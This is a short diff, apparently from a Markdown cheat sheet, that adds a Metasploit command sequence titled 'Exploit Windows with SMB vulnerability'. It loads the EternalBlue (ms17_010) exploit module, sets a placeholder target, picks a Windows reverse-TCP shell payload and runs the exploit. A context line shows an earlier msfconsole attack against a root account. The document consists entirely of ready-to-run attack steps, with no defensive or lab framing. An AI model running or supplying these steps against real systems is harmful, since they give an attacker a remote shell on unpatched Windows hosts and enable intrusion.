@@ -57,4 +57,12 @@ msfconsole
 > set RHOSTS your-target-ip
 > set USERNAME root
 > exploit
+
+# Exploit Windows with SMB vulnerability
+msfconsole
+> use exploit/windows/smb/ms17_010_eternalblue
+> options
+> set RHOSTS your-target-ip
+> set payload windows/x64/shell/reverse_tcp
+> exploit
 ```
